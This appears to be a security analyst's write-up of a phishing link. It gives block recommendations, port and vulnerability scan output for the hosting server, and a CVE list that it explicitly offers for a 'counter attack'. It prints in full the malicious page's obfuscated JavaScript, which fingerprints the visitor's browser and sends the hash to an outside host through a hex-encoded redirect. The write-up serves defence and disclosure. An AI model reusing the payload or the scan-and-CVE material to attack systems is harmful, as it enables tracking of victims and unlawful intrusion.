
# TB7mT95P

## Analysis

    Filip Pynckels
    Jul 24th, 2022

## Proposition

    Block network trafic to and from 137.184.228.130
    Block network trafic to and from Phot0.cr9pa.xyz, Phot0.hgy9t.xyz, Phot0.jgl9t.com, Phot0.php3d.online, Phot0.swq2q.com, Photo.gwx5q.com, Phot0.fnx4p.com, Phot0.jh4s.ques, Phot0.tr5se.com
    Block files containing significant code snippets of the malware

## 1. Attack vector

    The link https://phot0.tr5se.com/TB7mT95P is transmitted to an unsuspecting victim by means of messenger, together with a little text in the sense of 'look what I found'.

    When the victim clicks the link...

## 2. Server

#### 2.1 URL

    https://phot0.tr5se.com/TB7mT95P

#### 2.2 IP (ping)

    137.184.228.130

#### 2.3 Open ports (nmap)

##### 2.3.1 nmap

    22/tcp  open  ssh      OpenSSH 7.4 (protocol 2.0)
    | ssh-hostkey:
    |   2048 58:f7:83:fc:7f:f1:92:3e:04:a5:fa:65:74:fe:8e:73 (RSA)
    |   256 f3:07:61:0a:ef:70:10:c2:60:de:41:cf:07:10:fd:39 (ECDSA)
    |_  256 aa:f1:b6:8f:02:f3:48:a0:e8:27:7c:7e:5a:59:89:48 (ED25519)

    80/tcp  open  http     nginx
    |_http-title: Site doesn't have a title (text/html; charset=UTF-8).
    | http-robots.txt: 1 disallowed entry
    |_/

    443/tcp open  ssl/http nginx
    |_http-title: Site doesn't have a title (text/html; charset=UTF-8).
    | ssl-cert: Subject: commonName=137.184.228.130
    | Not valid before: 2022-07-07T00:23:33
    _Not valid after:  2032-07-04T00:23:33
    | http-robots.txt: 1 disallowed entry
    |_/
    | tls-alpn:
    |   http/1.1
    |   http/1.0
    |_  http/0.9
    |_ssl-date: TLS randomness does not represent time

##### 2.3.2 metasploit

    22/tcp: SSH server version: SSH-2.0-OpenSSH_7.4 ( service.version=7.4 service.vendor=OpenBSD service.family=OpenSSH service.product=OpenSSH service.cpe23=cpe:/a:openbsd:openssh:7.4 service.protocol=ssh fingerprint_db=ssh.banner )

#### 2.4 Location (https://www.ip2location.com/demo/137.184.228.130)

    IP               Country                   Region      City         ISP               Domain            Coordinates (N,W)
    137.184.228.130, United States of America, California, Santa Clara, DigitalOcean LLC, digitalocean.com, 37.3541, -121.9552

#### 2.5 Other malicious url's pointing to the same server:

    Phot0.cr9pa.xyz
    Phot0.hgy9t.xyz
    Phot0.jgl9t.com
    Phot0.php3d.online
    Phot0.swq2q.com
    Photo.gwx5q.com
    Phot0.fnx4p.com
    Phot0.jh4s.ques
    Phot0.tr5se.com

#### 2.6 Server vulnerabilities (to use in case of a counter attack)

##### 2.6.1 OpenSSH 7.4 server (https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=OpenSSH)

    + CVE-2022-31124    openssh_key_parser is an open source Python package providing utilities to parse and pack OpenSSH private and public key files. In versions prior to 0.0.6 if a field of a key is shorter than it is declared to be, the parser raises an error with a message containing the raw field value. An attacker able to modify the declared length of a key's sensitive field can thus expose the raw value of that field. Users are advised to upgrade to version 0.0.6, which no longer includes the raw field value in the error message. There are no known workarounds for this issue.
    + CVE-2021-41617    sshd in OpenSSH 6.2 through 8.x before 8.8, when certain non-default configurations are used, allows privilege escalation because supplemental groups are not initialized as expected. Helper programs for AuthorizedKeysCommand and AuthorizedPrincipalsCommand may run with privileges associated with group memberships of the sshd process, if the configuration specifies running the command as a different user.
    + CVE-2021-36368    ** DISPUTED ** An issue was discovered in OpenSSH before 8.9. If a client is using public-key authentication with agent forwarding but without -oLogLevel=verbose, and an attacker has silently modified the server to support the None authentication option, then the user cannot determine whether FIDO authentication is going to confirm that the user wishes to connect to that server, or that the user wishes to allow that server to connect to a different server on the user's behalf. NOTE: the vendor's position is "this is not an authentication bypass, since nothing is being bypassed."
    + CVE-2021-31580    The restricted shell provided by Akkadian Provisioning Manager Engine (PME) can be bypassed by switching the OpenSSH channel from `shell` to `exec` and providing the ssh client a single execution parameter. This issue was resolved in Akkadian OVA appliance version 3.0 (and later), Akkadian Provisioning Manager 5.0.2 (and later), and Akkadian Appliance Manager 3.3.0.314-4a349e0 (and later).
    + CVE-2021-28041    ssh-agent in OpenSSH before 8.5 has a double free that may be relevant in a few less-common scenarios, such as unconstrained agent-socket access on a legacy operating system, or the forwarding of an agent to an attacker-controlled host.
    + CVE-2020-5917     In BIG-IP versions 15.1.0-15.1.0.4, 15.0.0-15.0.1.3, 14.1.0-14.1.2.3, 13.1.0-13.1.3.4, 12.1.0-12.1.5.1, and 11.6.1-11.6.5.2 and BIG-IQ versions 5.2.0-7.0.0, the host OpenSSH servers utilize keys of less than 2048 bits which are no longer considered secure.
    + CVE-2020-15778    ** DISPUTED ** scp in OpenSSH through 8.3p1 allows command injection in the scp.c toremote function, as demonstrated by backtick characters in the destination argument. NOTE: the vendor reportedly has stated that they intentionally omit validation of "anomalous argument transfers" because that could "stand a great chance of breaking existing workflows."
    + CVE-2020-14871    Vulnerability in the Oracle Solaris product of Oracle Systems (component: Pluggable authentication module). Supported versions that are affected are 10 and 11. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Solaris. While the vulnerability is in Oracle Solaris, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Oracle Solaris. Note: This CVE is not exploitable for Solaris 11.1 and later releases, and ZFSSA 8.7 and later releases, thus the CVSS Base Score is 0.0. CVSS 3.1 Base Score 10.0 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H).
    + CVE-2020-14145    The client side in OpenSSH 5.7 through 8.4 has an Observable Discrepancy leading to an information leak in the algorithm negotiation. This allows man-in-the-middle attackers to target initial connection attempts (where no host key for the server has been cached by the client). NOTE: some reports state that 8.5 and 8.6 are also affected.
    + CVE-2020-1292     An elevation of privilege vulnerability exists in OpenSSH for Windows when it does not properly restrict access to configuration settings, aka 'OpenSSH for Windows Elevation of Privilege Vulnerability'.
    + CVE-2020-12062    ** DISPUTED ** The scp client in OpenSSH 8.2 incorrectly sends duplicate responses to the server upon a utimes system call failure, which allows a malicious unprivileged user on the remote server to overwrite arbitrary files in the client's download directory by creating a crafted subdirectory anywhere on the remote server. The victim must use the command scp -rp to download a file hierarchy containing, anywhere inside, this crafted subdirectory. NOTE: the vendor points out that "this attack can achieve no more than a hostile peer is already able to achieve within the scp protocol" and "utimes does not fail under normal circumstances."
    + CVE-2019-7639     An issue was discovered in gsi-openssh-server 7.9p1 on Fedora 29. If PermitPAMUserChange is set to yes in the /etc/gsissh/sshd_config file, logins succeed with a valid username and an incorrect password, even though a failure entry is recorded in the /var/log/messages file.
    + CVE-2019-6111     An issue was discovered in OpenSSH 7.9. Due to the scp implementation being derived from 1983 rcp, the server chooses which files/directories are sent to the client. However, the scp client only performs cursory validation of the object name returned (only directory traversal attacks are prevented). A malicious scp server (or Man-in-The-Middle attacker) can overwrite arbitrary files in the scp client target directory. If recursive operation (-r) is performed, the server can manipulate subdirectories as well (for example, to overwrite the .ssh/authorized_keys file).
    + CVE-2019-6110     In OpenSSH 7.9, due to accepting and displaying arbitrary stderr output from the server, a malicious server (or Man-in-The-Middle attacker) can manipulate the client output, for example to use ANSI control codes to hide additional files being transferred.
    + CVE-2019-6109     An issue was discovered in OpenSSH 7.9. Due to missing character encoding in the progress display, a malicious server (or Man-in-The-Middle attacker) can employ crafted object names to manipulate the client output, e.g., by using ANSI control codes to hide additional files being transferred. This affects refresh_progress_meter() in progressmeter.c.
    + CVE-2019-1859     A vulnerability in the Secure Shell (SSH) authentication process of Cisco Small Business Switches software could allow an attacker to bypass client-side certificate authentication and revert to password authentication. The vulnerability exists because OpenSSH mishandles the authentication process. An attacker could exploit this vulnerability by attempting to connect to the device via SSH. A successful exploit could allow the attacker to access the configuration as an administrative user if the default credentials are not changed. There are no workarounds available; however, if client-side certificate authentication is enabled, disable it and use strong password authentication. Client-side certificate authentication is disabled by default.
    + CVE-2019-16905    OpenSSH 7.7 through 7.9 and 8.x before 8.1, when compiled with an experimental key type, has a pre-authentication integer overflow if a client or server is configured to use a crafted XMSS key. This leads to memory corruption and local code execution because of an error in the XMSS key parsing algorithm. NOTE: the XMSS implementation is considered experimental in all released OpenSSH versions, and there is no supported way to enable it when building portable OpenSSH.
    + CVE-2018-20685    In OpenSSH 7.9, scp.c in the scp client allows remote SSH servers to bypass intended access restrictions via the filename of . or an empty filename. The impact is modifying the permissions of the target directory on the client side.
    + CVE-2018-15919    Remotely observable behaviour in auth-gss2.c in OpenSSH through 7.8 could be used by remote attackers to detect existence of users on a target system when GSS2 is in use. NOTE: the discoverer states 'We understand that the OpenSSH developers do not want to treat such a username enumeration (or "oracle") as a vulnerability.'
    + CVE-2018-15473    OpenSSH through 7.7 is prone to a user enumeration vulnerability due to not delaying bailout for an invalid authenticating user until after the packet containing the request has been fully parsed, related to auth2-gss.c, auth2-hostbased.c, and auth2-pubkey.c.
    + CVE-2017-5243     The default SSH configuration in Rapid7 Nexpose hardware appliances shipped before June 2017 does not specify desired algorithms for key exchange and other important functions. As a result, it falls back to allowing ALL algorithms supported by the relevant version of OpenSSH and makes the installations vulnerable to a range of MITM, downgrade, and decryption attacks.
    + CVE-2017-15906    The process_open function in sftp-server.c in OpenSSH before 7.6 does not properly prevent write operations in readonly mode, which allows attackers to create zero-length files.
    + CVE-2016-8858     ** DISPUTED ** The kex_input_kexinit function in kex.c in OpenSSH 6.x and 7.x through 7.3 allows remote attackers to cause a denial of service (memory consumption) by sending many duplicate KEXINIT requests. NOTE: a third party reports that "OpenSSH upstream does not consider this as a security issue."
    + CVE-2016-7407     The dropbearconvert command in Dropbear SSH before 2016.74 allows attackers to execute arbitrary code via a crafted OpenSSH key file. 

##### 2.6.2 Html nginx server (nikto)

    + Target IP:          137.184.228.130
    + Target Hostname:    137.184.228.130
    + Target Port:        80
    + Server: nginx

    + The anti-clickjacking X-Frame-Options header is not present.
    + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
    + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
    + /admin/cplogfile.log: DevBB 1.0 final (http://www.mybboard.com) log file is readable remotely. Upgrade to the latest version.
    + OSVDB-3233: /admin/admin_phpinfo.php4: Mon Album from http://www.3dsrc.com version 0.6.2d allows remote admin access. This should be protected.
    + OSVDB-376: /admin/contextAdmin/contextAdmin.html: Tomcat may be configured to let attackers read arbitrary files. Restrict access to /admin.
    + OSVDB-4804: //admin/admin.shtml: Axis network camera may allow admin bypass by using double-slashes before URLs.
    + OSVDB-2813: /admin/database/wwForum.mdb: Web Wiz Forums pre 7.5 is vulnerable to Cross-Site Scripting attacks. Default login/pass is Administrator/letmein
    + OSVDB-2842: //admin/aindex.htm: FlexWATCH firmware 2.2 is vulnerable to authentication bypass by prepending an extra '/'. http://packetstorm.linuxsecurity.com/0310-exploits/FlexWATCH.txt
    + OSVDB-2922: /admin/wg_user-info.ml: WebGate Web Eye exposes user names and passwords.
    + OSVDB-3092: /admin/: This might be interesting...
    + OSVDB-3093: /admin/cfg/configscreen.inc.php+: This might be interesting... has been seen in web logs from an unknown scanner.
    + OSVDB-3093: /admin/cfg/configsite.inc.php+: This might be interesting... has been seen in web logs from an unknown scanner.
    + OSVDB-3093: /admin/cfg/configsql.inc.php+: This might be interesting... has been seen in web logs from an unknown scanner.
    + OSVDB-3093: /admin/cfg/configtache.inc.php+: This might be interesting... has been seen in web logs from an unknown scanner.
    + OSVDB-3093: /admin/exec.php3: This might be interesting... has been seen in web logs from an unknown scanner.
    + OSVDB-3093: /admin/index.php: This might be interesting... has been seen in web logs from an unknown scanner.
    + OSVDB-3093: /admin/modules/cache.php+: This might be interesting... has been seen in web logs from an unknown scanner.
    + OSVDB-3093: /admin/objects.inc.php4: This might be interesting... has been seen in web logs from an unknown scanner.
    + OSVDB-3093: /admin/settings.inc.php+: This might be interesting... has been seen in web logs from an unknown scanner.
    + OSVDB-4238: /admin/adminproc.asp: Xpede administration page may be available. The /admin directory should be protected.
    + OSVDB-4239: /admin/datasource.asp: Xpede page reveals SQL account name. The /admin directory should be protected.
    + /admin/account.asp: Admin login page/section found.
    + /admin/account.html: Admin login page/section found.
    + /admin/controlpanel.asp: Admin login page/section found.
    + /admin/controlpanel.html: Admin login page/section found.
    + /admin/cp.asp: Admin login page/section found.
    + /admin/cp.html: Admin login page/section found.
    + /admin/home.asp: Admin login page/section found.
    + /admin/index.asp: Admin login page/section found.
    + /admin/index.html: Admin login page/section found.
    + /admin/login.asp: Admin login page/section found.
    + /admin/login.html: Admin login page/section found.

##### 2.6.3 Ssl/http nginx server (https://www.opencve.io/cve?vendor=nginx)

    + CVE-2022-30503    Nginx NJS v0.7.2 was discovered to contain a segmentation violation in the function njs_set_number at src/njs_value.h.
    + CVE-2022-29780    Nginx NJS v0.7.2 was discovered to contain a segmentation violation in the function njs_array_prototype_sort at src/njs_array.c.
    + CVE-2022-29779    Nginx NJS v0.7.2 was discovered to contain a segmentation violation in the function njs_value_own_enumerate at src/njs_value.c.
    + CVE-2021-46461    njs through 0.7.0, used in NGINX, was discovered to contain an out-of-bounds array access via njs_vmcode_typeof in /src/njs_vmcode.c.
    + CVE-2009-3898     Directory traversal vulnerability in src/http/modules/ngx_http_dav_module.c in nginx (aka Engine X) before 0.7.63, and 0.8.x before 0.8.17, allows remote authenticated users to create or overwrite arbitrary files via a .. (dot dot) in the Destination HTTP header for the WebDAV (1) COPY or (2) MOVE method.
    + CVE-2009-3896     src/http/ngx_http_parse.c in nginx (aka Engine X) 0.1.0 through 0.4.14, 0.5.x before 0.5.38, 0.6.x before 0.6.39, 0.7.x before 0.7.62, and 0.8.x before 0.8.14 allows remote attackers to cause a denial of service (NULL pointer dereference and worker process crash) via a long URI.
    + CVE-2019-7401     NGINX Unit before 1.7.1 might allow an attacker to cause a heap-based buffer overflow in the router process with a specially crafted request. This may result in a denial of service (router process crash) or possibly have unspecified other impact.

    Result of ssh version string corruption fuzzing: string=5353482d322e302d4f70656e5353485f352efe70312044656269616e2d357562756e747531

##### 2.6.4 robots.txt (no extra indications)

    User-agent: *
    Disallow: /

#### 2.7 Other server information (https://stat.ripe.net/app/launchpad/S1_137.184.228.130)

    + 137.184.228.130 has been found in one RECENT blocklist
    + Abuse contact abuse@digitalocean.com

## 3. Exploit TB7mT95P

#### 3.1 File type (wget, file)

    http document

#### 3.2 File contents (beautified)

    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
    <html xmlns="http://www.w3.org/1999/xhtml">
      <head>
        <title>Loading...
        </title>
        <meta name="viewport" content="width=320,initial-scale=1" />
        <style type="text/css">body,html{
          background:#fff;
          height:100%;
          margin:0;
          text-align:center}
          body:before{
            content:"";
            display:inline-block;
            vertical-align:middle;
            height:100%}
          div{
            font:bold 28px/160px arial;
            display:inline-block;
            color:#000;
            background:#32ad38;
            text-align:center;
            border-radius:50%;
            -moz-border-radius:50%;
            -webkit-border-radius:50%;
            width:160px;
            vertical-align:middle}
        </style>
      </head>
      <body>
        <div>Loading
        </div>
        <script type="text/javascript">!function(){
            var t=0;
            setInterval(function(){
              document.body.firstChild.style.opacity=.5+Math.abs(50-t++%100)/100}
                        ,10)}
          ();
          !function(u,o,c,a,f){
            function h(n){
              function t(n){
                return(n<16?"0":"")+n.toString(16)}
              for(var r="",e=137,i=0;i<n.length;++i){
                var u=170^n.charCodeAt(i)^255&i,e=e+u&255;
                r+=t(u)}
              return r+=t(e)}
            function n(){
              var n=new Date;
              function t(n){
                return"function"==typeof n}
              for(var r=[function(){
                return c.platform}
                         ,function(){
                           return"ontouchstart"in o||"onmsgesturechange"in o?1:f}
                         ,function(){
                           return a.availWidth}
                         ,function(){
                           return a.availHeight}
                         ,function(){
                           return c.plugins&&c.plugins.length||f}
                         ,function(){
                           return(o.ontouchstart+"")[0]}
                         ,function(){
                           return(o.onmsgesturechange+"")[0]}
                         ,function(){
                           return o.MSGesture?1:f}
                         ,function(){
                           return o.innerWidth}
                         ,function(){
                           return o.innerHeight}
                         ,function(){
                           return n.getTimezoneOffset()}
                         ,function(){
                           return(new Date).getTime()-n.getTime()}
                         ,function(){
                           return c.buildID}
                         ,function(){
                           return c.cookieEnabled?1:f}
                         ,function(){
                           return c.performance&&c.performance.navigation&&c.performance.navigation.redirectCount||f}
                         ,function(){
                           return c.performance&&c.performance.navigation&&c.performance.navigation.type||f}
                         ,function(){
                           return a.msOrientation||a.mozOrientation||(a.orientation||{
                           }
                                                                     ).type}
                         ,function(){
                           return o.devicePixelRatio}
                         ,function(){
                           return c.vendor}
                         ,function(){
                           return a.pixelDepth}
                         ,function(){
                           return a.colorDepth}
                         ,function(){
                           return a.deviceXDPI}
                         ,function(){
                           return a.deviceYDPI}
                         ,function(){
                           return t(u.hasFocus)?u.hasFocus():f}
                         ,function(){
                           return t(u.getComputedStyle)?1:f}
                         ,function(){
                           return o.history&&t(o.history.pushState)?1:f}
                         ,function(){
                           return a.width}
                         ,function(){
                           return a.height}
                         ,function(){
                         }
                         ,function(){
                         }
                         ,function(){
                           return window.self===window.top?f:1}
                         ,function(){
                           return c.webdriver?1:f}
                         ,function(){
                           var n,t=[];
                           for(n in window)t.push(n);
                           t.sort();
                           {
                             var[i,u=0]=[t.join("\0")];
                             let r=3735928559^u,e=1103547991^u;
                             for(let n=0,t;n<i.length;n++)t=i.charCodeAt(n),r=Math.imul(r^t,2654435761),e=Math.imul(e^t,1597334677);
                             return r=Math.imul(r^r>>>16,2246822507)^Math.imul(e^e>>>13,3266489909),4294967296*(2097151&(e=Math.imul(e^e>>>16,2246822507)^Math.imul(r^r>>>13,3266489909)))+(r>>>0)}
                         }
                        ],e=[],i=0;i<r.length;++i)try{
                e.push(r[i]())}
              catch(n){
                e.push("!")}
              return h(e.join("\0"))}
            var t;
            try{
              t=n()}
            catch(n){
              try{
                t=h([0,n.message||n].join("\0"))}
              catch(n){
                t=""}
            }
            o.location.replace("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x32\x2e\x72\x65\x64\x69\x72\x65\x63\x74\x6d\x61\x73\x74\x65\x72\x2e\x63\x6f\x6d\x2f\x3f\x75\x74\x6d\x5f\x74\x65\x72\x6d\x3d\x37\x31\x32\x34\x30\x30\x34\x35\x35\x31\x30\x30\x36\x33\x35\x35\x35\x30\x39\x26\x76\x65\x72\x3d\x34\x76\x69\x79\x61\x70\x74\x63\x6a\x6f&utm_content="+t)}
          (document,window,navigator,screen);
        </script>
      </body>
    </html>
